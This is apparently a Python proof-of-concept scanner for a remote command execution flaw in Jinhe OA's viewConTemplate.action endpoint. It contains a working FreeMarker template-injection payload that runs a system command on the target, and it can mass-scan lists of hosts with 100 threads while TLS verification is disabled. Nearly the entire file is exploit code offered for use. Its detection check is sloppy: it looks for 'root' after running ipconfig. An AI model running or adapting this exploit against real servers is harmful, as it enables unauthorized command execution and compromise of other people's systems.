import argparse,json,requests,sys,random
from multiprocessing.dummy import Pool   # 多线程的库
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


def poc(target):
    payload = "/jc6/platform/portalwb/portalwb-con-template!viewConTemplate.action"
    user_agents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1"
]
    headers1={
        "User-Agent": random.choice(user_agents),
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"
}
    headers2={
        "User-Agent": "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)",
        "Accept-Encoding": "gzip, deflate",
        "Accept": "*/*",
        "Connection": "close"
}
    data = """moduId=1&code=%253Cclob%253E%2524%257B%2522freemarker.template.utility.Execute%2522%253Fnew%28%29%28%2522ipconfig%2522%29%257D%253C%252Fclob%253E&uuid=1"""
    target = target.strip()
    if not target.startswith(('http://', 'https://')):
        target = 'http://' + target
    try :
        res1 = requests.get(url=target,headers=headers1,timeout=5,verify=False)
        if res1.status_code == 200:
                res2 = requests.get(url=target+payload,data=data,headers=headers2,timeout=5,verify=False)
                if 'root' in res2.text:
                    print(f"[+]{target}存在远程命令执行")
                    with open('result.txt','a',encoding='utf-8') as fp:
                        fp.write(target+'\n')
                else:
                    print (f"[-]{target}不存在远程命令执行")
        else:
            print(f"[*]{target}访问有问题，请手工检查")
    except:
        pass
def main():

#处理输入的参数
    parse = argparse.ArgumentParser(description= "金和OA viewConTemplate.action存在远程命令执行漏洞")
#添加命令行参数
    parse.add_argument('-u','--url',dest='url',type=str,help="please input your link")
    parse.add_argument('-f','--file',dest='file',type=str,help="please input your file path")


#实例化
    args = parse .parse_args()

#接下来得对用的输入做判断 要么用户输入的是一个url 要么是一个文件
    if args.url and not args.file:
#开始测试
        poc(args.url)
    elif args.file and not args.url:
        url_list = []
        with open (args.file,'r',encoding='utf-8') as fp :
            for i in fp.readlines() :
                url_list.append(i.strip())
        mp = Pool(100)
        mp.map(poc,url_list)
        mp.close
        mp.join
    else :
        print(f"usage:Python{sys.argv[0]} -h")

#设置程序的入口
if __name__ == "__main__":
    main()
